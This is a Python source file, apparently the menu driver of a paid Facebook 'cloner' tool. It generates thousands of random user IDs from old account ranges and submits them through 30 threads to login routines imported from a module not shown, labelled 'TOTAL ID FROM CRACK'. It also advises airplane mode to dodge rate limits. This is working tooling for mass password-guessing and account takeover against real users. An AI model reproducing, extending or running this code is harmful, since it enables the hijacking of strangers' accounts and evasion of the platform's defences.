import os
import sys
import random
import time
from concurrent.futures import ThreadPoolExecutor as tred
from config import rad, Y, G, W
from utils import linex
from login import login_1, login_2


def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

    print("""\033[1;32m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║ \033[1;31m   ██████╗  █████╗      ██╗ █████╗\033[0m          ║
║ \033[1;32m   ██╔══██╗██╔══██╗     ██║██╔══██╗\033[0m         ║
║ \033[1;33m   ██████╔╝███████║     ██║███████║\033[0m         ║
║ \033[1;34m   ██╔══██╗██╔══██║██   ██║██╔══██║\033[0m         ║
║ \033[1;35m   ██║  ██║██║  ██║╚█████╔╝██║  ██║\033[0m         ║
║ \033[1;36m   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝\033[0m         ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
\033[1;93m║ Author    : MR-RAJA CLONER 420              ║
\033[1;92m║ Facebook  : RAJA CLONER                     ║
\033[1;96m║ GitHub    : RAJA-CYBER420                   ║
\033[1;95m║ Telegram  : R C 4                           ║
\033[1;91m║ Tool      : PAID                            ║
\033[1;97m║ Version   : 2.5.8                           ║
\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0m                      
\033[0m""")


def BNG_71_():
    ____banner____()
    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
    print('\x1b[10;92m┃ \x1b[38;5;196m(A)\x1b[38;5;46m OLD CLONE\x1b[10;92m                         ┃')
    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
    __Jihad__ = input('\x1b[38;5;196m [+]\x1b[10;92m CHOOSE : \x1b[0m')
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    ____banner____()
    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
    print('\x1b[10;92m┃ \x1b[38;5;196m(A)\x1b[38;5;46m ALL SERIES\x1b[10;92m                        ┃')
    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
    print('\x1b[10;92m┃ \x1b[38;5;196m(B)\x1b[38;5;46m 100003/4 SERIES\x1b[10;92m                    ┃')
    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
    print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
    print('\x1b[10;92m┃ \x1b[38;5;196m(C)\x1b[38;5;46m 2009 series\x1b[10;92m                       ┃')
    print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
    _input = input(f"  \x1b[38;5;196m     [+]\x1b[10;92m CHOOSE :  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        print('\x1b[10;92m┗━\x1b[10;97m=============================================')
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break
